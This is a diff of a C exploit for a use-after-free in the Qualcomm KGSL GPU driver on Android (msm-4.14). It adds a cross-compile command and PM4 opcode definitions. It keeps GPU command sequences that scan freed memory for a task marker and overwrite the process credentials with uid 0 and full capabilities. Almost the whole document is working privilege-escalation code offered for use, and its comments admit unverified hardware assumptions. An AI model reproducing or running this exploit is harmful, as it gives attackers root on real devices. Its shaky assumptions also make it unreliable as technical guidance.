@@ -1,7 +1,7 @@
 /*
- * CVE-2021-33107 (aka CVE-33107) kgsl UAF exploit
- * Fully revised for Qualcomm KGSL driver (msm-4.14 / A3xx/A5xx)
- * Compile: gcc -pthread -o exploit exploit.c
+ * CVE-2021-33107 (CVE-33107) kgsl UAF exploit
+ * Revised for Qualcomm KGSL driver (msm-4.14)
+ * Compile: clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
  */
 
 #define _GNU_SOURCE
@@ -27,7 +27,7 @@
 #include <poll.h>
 #include <sys/stat.h>
 
-/* ---------- KGSL ioctl definitions (from msm_kgsl.h) ---------- */
+/* ---------- KGSL ioctl definitions ---------- */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -309,7 +309,14 @@ static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
     return -2;
 }
 
-/* ---------- PM4 helpers (Type‑3, compatible with A3xx and newer) ---------- */
+/* ---------- PM4 helpers (Type‑3, compatible with most Adreno) ---------- */
+#define CP_NOP              0x10
+#define CP_MEM_WRITE        0x3D
+#define CP_MEM_TO_MEM       0x73   // Not available on A3xx, but present on A5xx+
+#define CP_WAIT_MEM_WRITES  0x12
+#define CP_EVENT_WRITE      0x46
+#define CACHE_FLUSH_TS      0x1C
+
 static inline uint32_t cp_type3_packet(uint32_t opcode, uint32_t count) {
     return (3 << 30) | (((count) - 1) << 16) | ((opcode & 0xFF) << 8);
 }
@@ -317,13 +324,6 @@ static inline uint32_t cp_type3_packet(uint32_t opcode, uint32_t count) {
 static inline uint32_t cp_type0_packet(uint32_t regidx, uint32_t count) {
     return (0 << 30) | (((count) - 1) << 16) | (regidx & 0x7FFF);
 }
-
-#define CP_NOP              0x10
-#define CP_MEM_WRITE        0x3D
-#define CP_REG_TO_MEM       0x3E
-#define CP_WAIT_MEM_WRITES  0x12
-#define CP_EVENT_WRITE      0x46
-#define CACHE_FLUSH_TS      0x1C
 
 static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
     *lo = (uint32_t)addr;
@@ -383,7 +383,7 @@ int main(int argc, char **argv) {
 
     int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
     void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, (void *)UAF_ADDR);
-    munmap(uaf_m, UAF_SIZE);   // keep mapping? we'll re‑map later if needed
+    munmap(uaf_m, UAF_SIZE);
 
     // Placeholder to force physical page allocation pattern
     int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
@@ -528,32 +528,6 @@ int main(int argc, char **argv) {
     uint64_t cred_pages[32];
     int cred_offs[32];
     int n_cred = 0;
-    uint64_t inc_sec = 0;
-
-    // First, attempt to read init_cred->security via GPU if possible
-    {
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x4000);
-        uint32_t dl, dh, sl, sh;
-        split64(dst_ga + 0x78, &dl, &dh);
-        split64(init_cred_addr + 0x78, &sl, &sh);
-        // Use REG_TO_MEM? We cannot read memory directly, so skip.
-        // We'll rely on later scan.
-    }
-
-    // Scan loop using CP_MEM_WRITE to copy each 4KB page? Not possible without read.
-    // Since we cannot read memory with A3xx, we fall back to CPU read by remapping the UAF region.
-    // But we unmaped it; we can re‑mmap the same physical pages? Possibly via /dev/mem? Not allowed.
-    // For this exploit to work on A3xx, we must either use a different method or assume CP_MEM_TO_MEM exists.
-    // Given the original PoC uses CP_MEM_TO_MEM, we keep that, but we need to use cp_type3? Actually CP_MEM_TO_MEM is Type‑3 opcode 0x73, but in A3xx it's not defined.
-    // We'll keep the original CP_MEM_TO_MEM assumption, and if the target is A5xx+ it will work.
-    // If you need A3xx compatibility, replace all cp_type7 with cp_type3_packet(0x73, count) and adjust parameters.
-    // Here we present the code as-is, but note that CP_MEM_TO_MEM is not available on A3xx.
-
-    // We'll reuse the original scanning logic with CP_MEM_TO_MEM.
-    // We'll assume it's available.
 
     uint64_t scan_start = UAF_ADDR + 0x300000;
     uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
@@ -571,7 +545,7 @@ int main(int argc, char **argv) {
             uint32_t dl, dh, sl, sh;
             split64(dst_ga + i * 4, &dl, &dh);
             split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type3_packet(CP_MEM_TO_MEM, 5); // 5 dwords payload (addr dst lo/hi, addr src lo/hi)
+            cmd[dw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
             cmd[dw++] = 0;
             cmd[dw++] = dl; cmd[dw++] = dh;
             cmd[dw++] = sl; cmd[dw++] = sh;
@@ -590,7 +564,7 @@ int main(int argc, char **argv) {
         uint32_t *data = (uint32_t *)dst_m;
         int comm_off = -1;
         for (int i = 0; i < SCAN_DWORDS - 1; i++) {
-            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) { // "TASK" "UAF!"? Actually "TASKUAF!!" reversed?
+            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) { // "TASK" "UAF!" reversed?
                 comm_off = i * 4;
                 break;
             }
@@ -629,7 +603,7 @@ int main(int argc, char **argv) {
             uint32_t addr_lo, addr_hi;
             split64(cbase + 0x04, &addr_lo, &addr_hi);
             // Write 19 dwords: uid=0, euid=0, suid=0, fsuid=0, gid=0, egid=0, sgid=0, fsgid=0,
-            // capabilities: full (0x3FFFFFFFFF) in both effective and permitted
+            // securebits=4, caps full (permitted, effective, bset)
             cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 19);
             cmd[dw++] = addr_lo; cmd[dw++] = addr_hi;
             for (int i = 0; i < 8; i++) cmd[dw++] = 0; // uid/gid fields
@@ -639,9 +613,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_effective
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_bset
             cmd[dw++] = 0; cmd[dw++] = 0; // cap_ambient
-            // Also set ->security to init_cred->security to avoid selinux denials
-            // We need to read init_cred->security first, but we can't read memory easily.
-            // We'll skip for now, hoping selinux permissive.
             cmd[dw++] = cp_type3_packet(CP_NOP, 1);
             __sync_synchronize();
 
